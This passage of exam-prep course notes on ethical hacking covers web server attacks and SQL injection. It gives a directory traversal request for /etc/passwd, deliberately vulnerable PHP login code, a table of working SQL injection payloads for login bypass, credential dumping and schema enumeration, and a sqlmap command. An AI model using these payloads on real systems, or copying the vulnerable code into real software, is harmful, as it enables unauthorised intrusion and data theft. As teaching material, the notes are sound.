9. **Misconfigured SSL/TLS** — Old protocols, weak ciphers, self-signed certificates.
10. **Default Installation Pages** — Welcome pages leak version and module information.

---

## 2.5 Real-World Engineering Utility

- **Reconnaissance Phase:** Banner grabbing and version detection are Step 1 of penetration testing.
- **Compliance Audits:** PCI-DSS, HIPAA, and ISO 27001 mandate web server hardening.
- **Cloud Engineering:** AWS ALB, Azure App Gateway — all abstract the web server but inherit the same vulnerabilities.
- **IoT Security:** Many IoT devices (cameras, routers) embed lightweight web servers (e.g., **lighttpd**, **GoAhead**) — they are notoriously vulnerable.

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# 🧮 STEP-BY-STEP DERIVATIONS, ATTACK MODELS & ANALYTICAL MATRIX

> [!IMPORTANT]
> **Exhaustive Derivation Mandate Active:** Every step below is fully written out — no skips, no abbreviations. This matches KTU Examiner's 14-mark answer pattern.

---

## 3.1 Derivation 1: HTTP Request-Response Cycle (Full Logical Flow)

Let us model the complete HTTP transaction as a sequence of well-defined events. Each event is a step in the protocol state machine.

**Step 1 — TCP Connection Establishment**

The client opens a TCP socket to the server.

$$
\text{Client} \xrightarrow{\text{SYN (seq=x)}} \text{Server}
$$

$$
\text{Server} \xrightarrow{\text{SYN-ACK (seq=y, ack=x+1)}} \text{Client}
$$

$$
\text{Client} \xrightarrow{\text{ACK (seq=x+1, ack=y+1)}} \text{Server}
$$

*Explanation:* The 3-way handshake establishes a reliable byte stream. Port **80** (HTTP) or **443** (HTTPS) is used. Without this, no HTTP request can be sent.

**Step 2 — HTTP Request Transmission**

The client transmits a structured request:

$$
\text{Request} = \underbrace{\text{Method} + \text{URI} + \text{HTTP/1.1}}_{\text{Request Line}} + \underbrace{\text{Headers}}_{\text{Key: Value}} + \underbrace{\text{Blank Line}}_{\text{CRLF}} + \underbrace{\text{Body}}_{\text{Optional}}
$$

Example wire-format:

```
GET /login.php HTTP/1.1
Host: www.target.com
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session=abc123
```

*Explanation:* The **method** defines the action, the **URI** identifies the resource, and the **headers** carry metadata. The **body** is used for `POST` / `PUT` requests.

**Step 3 — Server-Side Processing**

The web server executes the following pseudo-logic:

$$
\text{Response} = f(\text{Request}) = \begin{cases}
\text{Static File} & \text{if URI maps to a file on disk} \\
\text{CGI/Script Output} & \text{if URI maps to an executable} \\
\text{Proxy Request} & \text{if reverse proxy configured} \\
\text{404 Not Found} & \text{if no resource matches}
\end{cases}
$$

**Step 4 — Response Transmission**

The server returns a structured response:

$$
\text{Response} = \underbrace{\text{HTTP/1.1 200 OK}}_{\text{Status Line}} + \underbrace{\text{Headers}}_{\text{Content-Type, Server, Set-Cookie}} + \underbrace{\text{CRLF}}_{\text{Blank Line}} + \underbrace{\text{Body}}_{\text{HTML / JSON / Binary}}
$$

*Explanation:* Status code `200` indicates success. The `Server` header is the focus of **banner grabbing attacks**.

**Step 5 — Connection Termination or Reuse**

$$
\text{Next Request} = \begin{cases}
\text{New TCP connection} & \text{if } \text{Connection: close} \\
\text{Reuse existing} & \text{if } \text{Connection: keep-alive}
\end{cases}
$$

---

## 3.2 Derivation 2: Banner Grabbing Attack Model

**Objective:** Extract the web server's identity (vendor + version) from HTTP response headers.

**Step 1:** Establish a TCP connection.

$$
\text{Port}_{\text{target}} = 80 \quad \text{(HTTP)}
$$

**Step 2:** Send a minimal HTTP request.

$$
\text{Request: } \texttt{GET / HTTP/1.1\r\nHost: target.com\r\n\r\n}
$$

**Step 3:** Receive the response headers.

$$
\text{Response: } \texttt{HTTP/1.1 200 OK} \\ \texttt{Server: Apache/2.2.15 (CentOS)} \\ \texttt{X-Powered-By: PHP/5.3.3}
$$

**Step 4:** Parse the `Server` and `X-Powered-By` fields.

$$
\text{Vendor} = \text{Apache}, \quad \text{Version} = 2.2.15, \quad \text{OS} = \text{CentOS}, \quad \text{Backend} = \text{PHP 5.3.3}
$$

**Step 5:** Cross-reference with vulnerability databases (e.g., **CVE**, **NVD**).

$$
\text{Apache 2.2.15} + \text{CentOS} \rightarrow \text{CVE-2012-1823 (PHP-CGI exploit)} \rightarrow \text{RCE possible}
$$

*Explanation:* Banner grabbing is the **gateway attack** — it tells the attacker which exploits to deploy.

---

## 3.3 Derivation 3: Directory Traversal Attack Model

**Objective:** Read files outside the webroot using `../` sequences.

**Step 1:** Vulnerable URI structure on server:

$$
\text{Webroot} = /var/www/html/, \quad \text{Requested File} = \text{file parameter}
$$

**Step 2:** Attacker crafts a malicious request.

$$
\text{URL: } \texttt{http://target.com/getfile?file=../../../../etc/passwd}
$$

**Step 3:** Server-side path concatenation.

$$
\text{Actual Path} = /var/www/html/ + ../../../../etc/passwd
$$

**Step 4:** Path resolution using POSIX semantics.

$$
\text{Resolved Path} = /var/www/html/../../../etc/passwd = /etc/passwd
$$

**Step 5:** Server returns the file.

$$
\text{Response: 200 OK} \\ \text{Body: } \texttt{root:x:0:0:root:/root:/bin/bash} \dots
$$

*Explanation:* The attacker now has OS-level file disclosure, enabling lateral movement.

---

## 3.4 Analytical Matrix: Attack vs. Defense

| Attack Type | Vulnerability Class | Attack Vector | KTU Defense (Mitigation) |
|---|---|---|---|
| Banner Grabbing | Information Disclosure | HTTP `Server` header | Strip banner, use `ServerTokens Prod` |
| Directory Traversal | Path Manipulation | `../` in URL parameters | Input validation, chroot jail |
| DoS / DDoS | Resource Exhaustion | High-volume HTTP requests | Rate limiting, WAF, CDN |
| Buffer Overflow | Memory Corruption | Long URLs / headers | Patch server, ASLR, DEP |
| HTTP Request Smuggling | Protocol Discrepancy | Conflicting `CL` / `TE` headers | Reject ambiguous requests |
| RCE via CGI | Unpatched Binaries | Malicious input to `.cgi` | Patch, sandbox, disable CGI |
| XST (Cross-Site Tracing) | `TRACE` Method | Cookie exfiltration | Disable `TRACE` method |
| Session Hijacking | Weak Session ID | Cookie theft | HTTPS, HttpOnly, Secure flags |
| Misconfigured SSL/TLS | Weak Crypto | POODLE, BEAST, Heartbleed | TLS 1.2+, strong ciphers |
| Default Credentials | Authentication | Brute-force login | Change defaults, MFA, lockout policy |

---

## 3.5 Numerical Example: DoS Attack Bandwidth Calculation

> [!NOTE]
> **Problem (KTU 14-Mark Style):** A web server has a max bandwidth of **1 Gbps**. An attacker launches a SYN flood. If each SYN packet is **64 bytes**, how many packets per second (pps) can the server theoretically receive before saturation?

**Solution:**

$$
\text{Bandwidth}_{\max} = 1 \, \text{Gbps} = 10^9 \, \text{bits/second}
$$

$$
\text{Bytes/second} = \frac{10^9}{8} = 1.25 \times 10^8 \, \text{bytes/second}
$$

$$
\text{Packet Size} = 64 \, \text{bytes}
$$

$$
\text{Max PPS} = \frac{1.25 \times 10^8}{64} \approx 1.953 \times 10^6 \, \text{packets/second}
$$

$$
\boxed{\text{Max PPS} \approx 1.95 \, \text{million packets/second}}
$$

*Explanation:* A single attacker with a botnet of even 10,000 machines (each sending 200 pps) can easily exceed this. Hence **DDoS mitigation** (Cloudflare, Akamai, AWS Shield) is mandatory.

---

## 3.6 Penetration Testing Workflow for Web Servers (Exhaustive)

1. **Passive Reconnaissance** — WHOIS, Shodan, Google Dorking.
2. **Active Reconnaissance** — DNS enumeration, port scanning (`nmap -sV -p 80,443`).
3. **Banner Grabbing** — `nc`, `curl -I`, `whatweb`.
4. **Vulnerability Scanning** — `Nikto`, `OpenVAS`, `Nessus`.
5. **Exploitation** — Metasploit modules, custom scripts.
6. **Post-Exploitation** — Privilege escalation, persistence.
7. **Reporting** — CVSS scoring, remediation steps.

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# 🏗️ STRUCTURAL DIAGRAMS & SCHEMATICS

## 4.1 Web Server Functional Architecture (Mermaid Block Diagram)

```mermaid
flowchart TB
    A[Client Browser] --> B[Firewall and IDS Layer]
    B --> C[Reverse Proxy Nginx]
    C --> D[Web Server Apache]
    D --> E{Static or Dynamic Request}
    E -->|Static| F[File System Disk]
    E -->|Dynamic| G[Application Server PHP Python]
    G --> H[Database MySQL]
    F --> I[HTTP Response Builder]
    H --> I
    I --> D
    D --> C
    C --> B
    B --> A
    styleA([Client Browser])
    styleB([Firewall IDS])
    styleC([Reverse Proxy])
    styleD([Web Server])
    styleF([File System])
    styleG([App Server])
    styleH([Database])
    styleI([Response Builder])
```

## 4.2 HTTP Request-Response State Machine

```mermaid
flowchart LR
    S1[Client Sends SYN] --> S2[Server Sends SYN ACK]
    S2 --> S3[Client Sends ACK]
    S3 --> S4[Client Sends HTTP Request]
    S4 --> S5[Server Parses Request]
    S5 --> S6{Resource Exists}
    S6 -->|Yes| S7[Execute or Fetch Resource]
    S6 -->|No| S8[Return 404 Not Found]
    S7 --> S9[Build HTTP Response]
    S8 --> S9
    S9 --> S10[Send Response to Client]
    S10 --> S11{Connection Keep Alive}
    S11 -->|Yes| S4
    S11 -->|No| S12[Client Sends FIN]
    S12 --> S13[Connection Closed]
```

## 4.3 Web Server Attack Kill Chain (Recon to Exploitation)

```mermaid
flowchart TB
    A1[Step 1 Reconnaissance] --> A2[Step 2 Scanning]
    A2 --> A3[Step 3 Banner Grabbing]
    A3 --> A4[Step 4 Vulnerability Identification]
    A4 --> A5[Step 5 Exploitation]
    A5 --> A6[Step 6 Post Exploitation]
    A6 --> A7[Step 7 Reporting and Remediation]
    styleA1([Reconnaissance])
    styleA2([Scanning])
    styleA3([Banner Grabbing])
    styleA4([Vulnerability ID])
    styleA5([Exploitation])
    styleA6([Post Exploitation])
    styleA7([Reporting])
```

## 4.4 Web Server Hardening Defense-in-Depth Layers

```mermaid
flowchart TB
    L1[Layer 1 Network Firewall] --> L2[Layer 2 DDoS Protection CDN]
    L2 --> L3[Layer 3 Reverse Proxy WAF]
    L3 --> L4[Layer 4 Hardened Web Server]
    L4 --> L5[Layer 5 Secure Application Code]
    L5 --> L6[Layer 6 Encrypted Database]
    L6 --> L7[Layer 7 Logging and Monitoring SIEM]
    styleL1([Network Firewall])
    styleL2([DDoS CDN])
    styleL3([Reverse Proxy WAF])
    styleL4([Hardened Server])
    styleL5([App Code])
    styleL6([DB Encryption])
    styleL7([SIEM])
```

## 4.5 Block-Level Comparison: Apache vs. Nginx vs. IIS

```mermaid
flowchart LR
    subgraph APACHE
        A1[Process Based]
        A2[One Thread Per Request]
        A3[.htaccess Support]
        A4[PHP Module Integration]
    end
    subgraph NGINX
        N1[Event Driven]
        N2[Async Non Blocking]
        N3[High Concurrency]
        N4[Reverse Proxy Native]
    end
    subgraph IIS
        I1[Windows Native]
        I2[ASP NET Integration]
        I3[GUI Manager]
        I4[Active Directory Auth]
    end

    NGINX --- IIS
    IIS --- APACHE
```

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
# 📝 KTU 2024 SCHEME EXAMINATION QUESTION BANK & TOPIC RECAP

---

## PART A — Short Answer Questions (3 Marks Each)

### **Question 1** `[KTU University Exam – May 2024]`
**Define a Web Server. List any FOUR popular web server software with their default ports.**

**Model Answer (3 Marks):**
- **Definition (1.5 marks):** A web server is a software/hardware system that stores, processes, and delivers web content (HTML, images, scripts) to clients over **HTTP (port 80)** or **HTTPS (port 443)**.
- **List (1.5 marks):**
  - Apache HTTPD — port 80/443
  - Nginx — port 80/443
  - Microsoft IIS — port 80/443
  - Tomcat — port 8080

---

### **Question 2** `[KTU University Exam – Dec 2023]`
**What is Banner Grabbing? Why is it considered the first step in web server penetration testing?**

**Model Answer (3 Marks):**
- **Definition (1.5 marks):** Banner grabbing is the technique of retrieving the `Server` and `X-Powered-By` HTTP response headers to identify the web server's vendor, version, and underlying technology.
- **Significance (1.5 marks):**
  - Helps the attacker select **known CVEs** matching the version.
  - Reveals the OS and backend scripting language.
  - Enables **targeted exploitation** rather than blind attacks.

---

## PART B — Long Answer Questions (14 Marks Each)

> [!WARNING]
> **KTU Examiner's Valuation Warning / Pitfall Callout:**
> - Do NOT skip the **attack scenario / real-world example** — examiners allocate 2–3 marks specifically for this.
> - Always mention the **default port number (80 / 443)** in your answer. Marks are deducted if omitted.
> - When listing HTTP status codes, **group them by class (2xx, 4xx, 5xx)** — random listing loses structure marks.
> - For attack descriptions, always pair them with the **corresponding mitigation**. Half-credit answers miss this.
> - Avoid one-line definitions for 14-mark questions — examiners expect **diagrams, examples, and tabular comparisons**.

---

### **Question A (14 Marks)** `[KTU University Exam – Model Paper 2024]`

**(a) Explain the working of a web server with a neat diagram. Describe the HTTP request-response cycle in detail. (7 Marks)**

**(b) List and explain any SEVEN common web server vulnerabilities with their respective attack vectors and mitigations. (7 Marks)**

**Model Solution:**

**(a) Working of a Web Server & HTTP Request-Response Cycle (7 Marks)**

1. **Connection Establishment (1 mark):** The browser opens a TCP 3-way handshake on **port 80** (HTTP) or **port 443** (HTTPS). For HTTPS, a **TLS handshake** follows to negotiate encryption.

2. **Request Line (1 mark):** The client sends:
   `GET /index.html HTTP/1.1`
   The server parses the **Method** (`GET`), **URI** (`/index.html`), and **HTTP Version** (`HTTP/1.1`).

3. **Headers (1 mark):** Metadata like `Host`, `User-Agent`, `Cookie`, `Accept`, `Authorization` are transmitted.

4. **Server Processing (1.5 marks):** The server maps the URI to a file (e.g., `/var/www/html/index.html`) or routes to a script (e.g., `index.php` → PHP interpreter → MySQL).

5. **Response Construction (1.5 marks):** The server constructs:
   - **Status Line:** `HTTP/1.1 200 OK`
   - **Headers:** `Content-Type`, `Server`, `Set-Cookie`
   - **Body:** HTML / JSON / binary content

6. **Connection Handling (1 mark):** If `Connection: keep-alive`, the TCP session is reused. Otherwise, a `FIN` packet closes the connection.

**Diagram (included in answer):** Refer to **Section 4.1 / 4.2** of these notes.

---

**(b) Seven Common Web Server Vulnerabilities (7 Marks — 1 mark each)**

| # | Vulnerability | Attack Vector | Mitigation |
|---|---|---|---|
| 1 | **Information Disclosure** | Banner reveals `Apache/2.2.15` | `ServerTokens Prod`, hide version |
| 2 | **Directory Traversal** | `../../etc/passwd` in URL | Input validation, chroot |
| 3 | **Remote Code Execution** | Exploiting unpatched CGI | Patch, disable unnecessary modules |
| 4 | **DoS / DDoS** | Flooding with HTTP requests | Rate limiting, CDN, WAF |
| 5 | **Buffer Overflow** | Overlong URL → memory corruption | Patch, ASLR, DEP |
| 6 | **HTTP Request Smuggling** | `Content-Length` vs `Transfer-Encoding` conflict | Reject ambiguous requests |
| 7 | **Misconfigured SSL/TLS** | POODLE, BEAST on old protocols | Use TLS 1.2+, strong ciphers |

---

### **Question B (14 Marks)** `[KTU University Exam – Model Paper 2024]`

**(a) Describe the various types of web server attacks. Explain DoS, DDoS, and HTTP Request Smuggling in detail. (7 Marks)**

**(b) Explain web server hardening techniques with a defense-in-depth model. (7 Marks)**

**Model Solution:**

**(a) Web Server Attacks — DoS, DDoS, HTTP Request Smuggling (7 Marks)**

1. **DoS — Denial of Service (2 marks):**
   - A single attacker floods the server with requests, exhausting **CPU, memory, or bandwidth**.
   - Example: **SYN flood** — attacker sends many `SYN` packets but never completes the handshake, exhausting the server's connection table.
   - Mitigation: SYN cookies, rate limiting, upstream filtering.

2. **DDoS — Distributed Denial of Service (2.5 marks):**
   - Multiple compromised machines (a **botnet**) coordinate to flood the target.
   - Example: **Mirai botnet (2016)** — 600 Gbps attack on Dyn DNS provider.
   - Mitigation: CDN (Cloudflare, Akamai), Anycast routing, AWS Shield.

3. **HTTP Request Smuggling (2.5 marks):**
   - Exploits discrepancies between a **front-end proxy** and the **back-end server** in parsing `Content-Length` vs `Transfer-Encoding`.
   - Attacker smuggles a second hidden request inside the first.
   - Mitigation: Reject ambiguous requests, normalize HTTP parsing, patch proxies.

---

**(b) Web Server Hardening & Defense-in-Depth (7 Marks)**

1. **Patch Management (1 mark):** Regularly update server software and apply security patches.
2. **Disable Unnecessary Modules (1 mark):** Turn off `mod_cgi`, `TRACE`, etc.
3. **Banner Suppression (1 mark):** Configure `ServerTokens Prod` (Apache) or `server_tokens off` (Nginx).
4. **Strong SSL/TLS Configuration (1 mark):** TLS 1.2+, disable weak ciphers (RC4, 3DES).
5. **Access Control & Authentication (1 mark):** Implement IP whitelisting, MFA, and lockout policies.
6. **Logging & Monitoring (1 mark):** Centralized logging into a **SIEM** (Splunk, ELK).
7. **WAF & Rate Limiting (1 mark):** Deploy a **Web Application Firewall** (ModSecurity) and configure rate limits.

**Defense-in-Depth Diagram:** Refer to **Section 4.4** of these notes.

---

## 📌 TOPIC RECAP & IMPORTANT THINGS TO REMEMBER

> [!IMPORTANT]
> **Rapid Revision Checklist — Web Server (Module 2)**

- ✅ **Web Server** = software that serves HTTP/HTTPS content on **port 80 / 443**.
- ✅ **Top servers:** Apache (Linux), IIS (Windows), Nginx (high-performance).
- ✅ **HTTP cycle:** TCP handshake → Request line → Headers → Server processing → Response → Connection close/keep-alive.
- ✅ **HTTP methods:** `GET, POST, PUT, DELETE, HEAD, OPTIONS, TRACE, PATCH`. **`TRACE` is dangerous** — enables XST.
- ✅ **Status codes:** 1xx info, 2xx success, 3xx redirect, 4xx client error, 5xx server error.
- ✅ **Banner Grabbing** = first attack — reveals server version via `Server:` header.
- ✅ **Directory Traversal** = `../` to escape webroot → reads `/etc/passwd`.
- ✅ **DoS / DDoS** = resource exhaustion — mitigated by CDN, rate limiting.
- ✅ **HTTP Request Smuggling** = exploits `CL` vs `TE` header conflict between proxy and server.
- ✅ **Information Disclosure** = always strip server version and `X-Powered-By` headers.
- ✅ **SSL/TLS:** Use TLS 1.2+, strong ciphers, disable SSLv3, TLS 1.0/1.1.
- ✅ **Hardening layers:** Patch → Disable modules → Strip banner → Strong TLS → ACL → Logging → WAF.
- ✅ **Pen-testing tools:** `nmap`, `Nikto`, `Burp Suite`, `OWASP ZAP`, `Metasploit`, `sqlmap`, `Hydra`.
- ✅ **OWASP Top 10 alignment** — most web server attacks map to A01 (Broken Access Control) or A05 (Security Misconfiguration).
- ✅ **IoT context:** Many IoT devices use **lighttpd** or **GoAhead** web servers — these are notoriously vulnerable to default credentials and unpatched CVEs.

> 🎯 **Exam Mantra:** *"Always mention the default port (80/443), pair every attack with its mitigation, and draw at least one diagram in a 14-mark answer."*

<!-- SECTION_5_END -->

topics.title: SQL Injection
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PBCCT604 - ETHICAL HACKING & IOT SECURITY
> - **Module:** Module 2
> - **Topic:** SQL Injection

<!-- SECTION_1_START -->
## 1. Core Technical Definition & Intuitive Overview

### 1.1 Formal Academic Definition (KTU 2024 Syllabus Terminology)

**SQL Injection (SQLi)** is a code injection technique that exploits security vulnerabilities present in the data layer of an application. It occurs when an attacker interferes with the queries that an application makes to its database. According to **OWASP (Open Web Application Security Project)**, SQL Injection has consistently ranked in the **Top 3 web application vulnerabilities** for over two decades, demonstrating its critical importance in ethical hacking curricula.

> [!IMPORTANT]
> **KTU Definition (Examination Standard):**
> SQL Injection is a client-side or server-side attack vector in which malicious Structured Query Language (SQL) statements are inserted into an input field for execution (e.g., to dump the database contents to the attacker, modify data, or execute administrative operations on the database).

The vulnerability exists because user-supplied input is incorrectly filtered (or not strongly typed) and unexpectedly executed as part of a SQL command.

### 1.2 Conceptual Analogy — The "Bouncer at the Club"

Imagine a high-end nightclub with a strict **bouncer** at the entrance. The bouncer's job is simple: check the guest list and let in only those whose names match **exactly**. 

- **Normal Operation:** A guest (the *application*) shows a paper with the name "Alice" → Bouncer checks the VIP list → "Alice" is found → Entry granted.
- **SQL Injection Attack:** A malicious guest hands over a paper that reads: 
  *"Alice OR 1=1 — I am also the owner's cousin, ignore the rest of the list."*
- The naïve bouncer (the *database query parser*) treats the **entire line as a name** and says: "Let me check… is it Alice? Yes. Is 1=1? Always true. Let him in." The bouncer has been **tricked by combining guest identity with club rules**.

In technical terms, the attacker has **concatenated** their malicious logic (`OR 1=1`) into the original SQL query, causing the WHERE clause to evaluate to true for *every* row.

### 1.3 Vulnerable vs. Secure Code — First Look

A vulnerable login check in PHP might look like this:

```php
// VULNERABLE CODE
$query = "SELECT * FROM users WHERE username = '" . $_POST['user'] . "' AND password = '" . $_POST['pass'] . "'";
```

If an attacker enters `admin' --` in the username field, the resulting query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

Everything after `--` is treated as a **comment**, so the password check is bypassed entirely.

> [!NOTE]
> **Key Metrics for KTU:**
> - **CVSS Severity Score for SQLi:** Typically **9.8 (Critical)**.
> - **CWE Classification:** **CWE-89** ("Improper Neutralization of Special Elements used in an SQL Command").
> - **OWASP Top 10 (2021):** Listed under **A03:2021 – Injection**.

### 1.4 Why Ethical Hackers Study SQL Injection

As an ethical hacker, you are authorized to perform **authorized SQLi testing** within the scope of a penetration test. The goal is to identify, exploit (proof-of-concept), and **document the vulnerability** so the development team can remediate it using **parameterized queries (prepared statements)**, **stored procedures**, or **input validation**.

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
## 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

### 2.1 The Operational Mechanism — How a SQLi Works

A SQL Injection attack follows a predictable **5-stage lifecycle**:

1. **Reconnaissance (Information Gathering):** The attacker identifies input vectors (login forms, search bars, URL parameters like `?id=1`, cookies, HTTP headers).
2. **Injection Point Identification:** The attacker injects harmless but syntactically significant characters (like a single quote `'` or double dash `--`) to test if the application produces a database error.
3. **Fingerprinting the DBMS:** Based on error messages or behavior, the attacker determines whether the backend is **MySQL, PostgreSQL, MSSQL, Oracle, or SQLite**.
4. **Payload Crafting & Exploitation:** A tailored SQL payload is constructed to extract data, bypass authentication, or gain command execution.
5. **Exfiltration / Privilege Escalation:** Data is exfiltrated, files are read from disk, or even **OS-level shell access** is obtained (in advanced cases like MSSQL's `xp_cmdshell`).

### 2.2 The Query Anatomy — The "Why" Behind the Exploit

Consider a generic web application retrieving product details by ID:

```sql
SELECT name, price FROM products WHERE id = <USER_INPUT>
```

The application developer *concatenates* user input directly into the SQL string. This is the **root cause** — the application fails to maintain a **separation between code (the query) and data (the user input)**.

> [!IMPORTANT]
> **The Cardinal Rule of Secure Database Interaction:**
> **Never trust user input. Code and data must be strictly separated.**
> This is achieved using **Parameterized Queries (Prepared Statements)**, where the query template is compiled first and the user data is bound as a typed parameter — never as executable code.

### 2.3 KTU High-Yield Classification Sheet (Cheat Table)

The following table is **high-yield for KTU examinations** — memorize the categories and their distinguishing characteristics.

| Injection Type | Attack Vector | DBMS Response Visibility | Typical SQL Operator | Detection Difficulty |
|---|---|---|---|---|
| **In-band (Classic) SQLi** | Same channel (response) used for attack and result | Errors / data shown directly in the page | `UNION SELECT`, `OR 1=1` | **Low** |
| **Error-Based SQLi** | Forced DBMS error messages leak schema/data | Verbose error messages | `EXTRACTVALUE()`, `CAST()` | Low |
| **Union-Based SQLi** | Appends `UNION SELECT` to combine results | Data dumped into the application response | `UNION ALL SELECT` | Low |
| **Blind Boolean-Based** | Boolean TRUE/FALSE responses (page difference) | Page renders differently | `AND 1=1`, `AND 1=2` | **Medium** |
| **Blind Time-Based** | Time delays indicate TRUE/FALSE | No visible difference; only response time | `SLEEP()`, `WAITFOR DELAY` | **High** |
| **Out-of-Band SQLi** | Different channel (DNS, HTTP) for exfiltration | Requires outbound network from DB | `xp_dirtree`, `LOAD_FILE` | **High** |
| **Second-Order SQLi** | Payload stored, executed later in another query | No immediate response | Stored in DB, triggers later | **Very High** |

> [!NOTE]
> **KTU Examiner's Tip:** In Part A (3-mark) questions, the most frequently asked distinction is between **In-band vs. Blind vs. Out-of-band SQLi**. Memorize the table above verbatim.

### 2.4 Real-World Engineering Utility

- **Penetration Testing:** SQLi is the **#1 vulnerability** in OWASP's Top 10 and is a compulsory module in **CEH (Certified Ethical Hacker)** and **OSCP** syllabi.
- **IoT Security (Module Context):** Many IoT devices use lightweight SQL engines (e.g., **SQLite**) to store sensor logs. A compromised IoT web interface can leak entire device fleets.
- **Bug Bounty Programs:** SQLi findings historically command **USD $1,000 – $10,000+** bounties on platforms like HackerOne.
- **Compliance & Auditing:** Standards like **PCI-DSS 6.5.1**, **ISO 27001 A.14.2.5**, and **NIST SP 800-53 SI-10** mandate protection against injection flaws.

### 2.5 Remediation Cheat Sheet (Likely Part A or 2-Mark Question)

| Defense Mechanism | Effectiveness | KTU Note |
|---|---|---|
| **Parameterized Queries (Prepared Statements)** | **Gold Standard** — recommended by OWASP | Always the first-choice answer |
| **Stored Procedures** | High (when properly implemented) | Acceptable alternative |
| **Whitelist Input Validation** | High (for known input types like IDs) | Combine with parameterization |
| **Escaping User Input** | Low (error-prone, deprecated by OWASP) | Avoid in modern apps |
| **WAF (Web Application Firewall)** | Medium (defense-in-depth) | Not a replacement for code fixes |
| **Principle of Least Privilege (DB User)** | High | Restrict DB account permissions |

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
## 3. Step-by-Step Derivations & Analytical Matrix

### 3.1 Exhaustive Walkthrough — A Real SQLi Attack on a Login Form

Let us reconstruct, **step by step**, how an attacker bypasses authentication on a vulnerable login form. We will use a **MySQL backend** as our reference.

#### Step 1: The Vulnerable Source Code (Server-Side)

A typical vulnerable PHP backend:

```php
<?php
$user = $_POST['username'];
$pass = $_POST['password'];
$sql  = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
$result = mysqli_query($conn, $sql);
if (mysqli_num_rows($result) > 0) {
    echo "Login Successful!";
} else {
    echo "Invalid credentials.";
}
?>
```

**Logical Derivation of the Vulnerability:**

$$
\text{Query} = \text{Static SQL Template} \oplus \text{User Input}
$$

Where $\oplus$ denotes string concatenation. Since `$_POST['username']` is taken as raw text and glued into the query, the attacker controls part of the **executable code**, not just the data.

#### Step 2: The Attacker Crafts a Malicious Payload

The attacker enters the following in the username field:

```
admin' --
```

And any value (e.g., `xyz`) in the password field.

#### Step 3: The Resulting SQL Query (Exhaustive Construction)

$$
\begin{aligned}
Q_{\text{original}} &= \texttt{SELECT * FROM users WHERE username = '}u\texttt{' AND password = '}p\texttt{'} \\
Q_{\text{injected}} &= \texttt{SELECT * FROM users WHERE username = 'admin' --' AND password = 'xyz'}
\end{aligned}
$$

**Textual Explanation of Each Segment:**

- `SELECT * FROM users` — the operation: read all columns from the `users` table.
- `WHERE username = 'admin'` — the *injected* condition: looks for a user named "admin".
- `--` — the **SQL single-line comment marker** (valid in MySQL, MSSQL, PostgreSQL). Everything after it is ignored by the database engine.
- `' AND password = 'xyz'` — *neutralized*; the database parser never sees it.

**Effective Executed Query:**

$$
Q_{\text{eff}} = \texttt{SELECT * FROM users WHERE username = 'admin'}
$$

#### Step 4: Logical Outcome

The query returns the row for `admin` (assuming it exists). `mysqli_num_rows($result)` evaluates to **1 (true)**, so the PHP code prints:

```
Login Successful!
```

**Authentication bypassed.** The attacker never knew the password.

#### Step 5: Generalization — The Authentication Bypass Formula

For any login form with a vulnerable query of the form:

$$
Q = \texttt{SELECT * FROM users WHERE username = '}u\texttt{' AND password = '}p\texttt{'}
$$

An attacker can bypass it using the universal payload:

$$
u = \texttt{' OR '1'='1' --}
$$

**Proof by Substitution:**

$$
\begin{aligned}
Q_{\text{injected}} &= \texttt{SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'} \\
Q_{\text{eff}} &= \texttt{SELECT * FROM users WHERE username = '' OR '1'='1'}
\end{aligned}
$$

Since `'1'='1'` is **always true**, the `OR` condition returns **every row** in the `users` table, granting access to the **first user** (often the administrator).

### 3.2 Analytical Matrix — Exhaustive Payload Library

| # | Goal | SQLi Payload (MySQL flavor) | Where Injected | Outcome |
|---|---|---|---|---|
| 1 | **Authentication Bypass** | `' OR '1'='1' --` | Username field | Logs in as first user |
| 2 | **Authentication Bypass (URL)** | `?id=1' OR '1'='1` | URL parameter | Returns all rows |
| 3 | **Determine Column Count** | `' ORDER BY 1--` then 2, 3, 4… | URL parameter | Error → exact column count |
| 4 | **UNION-Based Data Extraction** | `' UNION SELECT username, password FROM users--` | URL parameter | Dumps credentials |
| 5 | **Enumerate DB Version** | `' UNION SELECT @@version, NULL--` | URL parameter | Leaks MySQL version |
| 6 | **Enumerate All Databases** | `' UNION SELECT schema_name, NULL FROM information_schema.schemata--` | URL parameter | Lists databases |
| 7 | **Enumerate All Tables** | `' UNION SELECT table_name, NULL FROM information_schema.tables--` | URL parameter | Lists tables |
| 8 | **Enumerate All Columns** | `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--` | URL parameter | Lists columns |
| 9 | **Time-Based Blind** | `1' AND SLEEP(5)--` | URL parameter | 5-second delay = TRUE |
| 10 | **Boolean-Based Blind** | `1' AND (SELECT SUBSTRING(@@version,1,1))='5` | URL parameter | Page renders differently |

### 3.3 Boolean-Based Blind SQLi — Exhaustive Bit-by-Bit Deduction

When the application hides errors and does not display query results, the attacker uses **Boolean-Based Blind SQLi**. The process is:

1. The attacker asks a question that has a **TRUE** or **FALSE** answer.
2. The application responds differently (e.g., "Welcome, user" vs. "No user found").
3. By asking thousands of binary questions, the attacker reconstructs the entire database.

**Example (extracting first character of MySQL version):**

$$
\begin{aligned}
P_1 &= \texttt{1' AND SUBSTRING(@@version,1,1)='5} \\
P_2 &= \texttt{1' AND SUBSTRING(@@version,1,1)='4} \\
&\vdots \\
P_n &= \texttt{1' AND SUBSTRING(@@version,1,1)='M}
\end{aligned}
$$

**Textual Explanation:** Each payload injects a condition checking the first character of `@@version`. If the page loads normally (e.g., the product is shown), the answer is TRUE. The attacker then moves to the second character, and so on, building the version string one character at a time.

This process is **automated** by tools like **sqlmap** (`sqlmap -u "http://target.com/item?id=1" --dbs`).

### 3.4 Time-Based Blind SQLi — Exhaustive Derivation

When **no visual difference** exists between TRUE and FALSE responses, the attacker uses **time delays**:

$$
P = \texttt{1' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--}
$$

**Interpretation:**

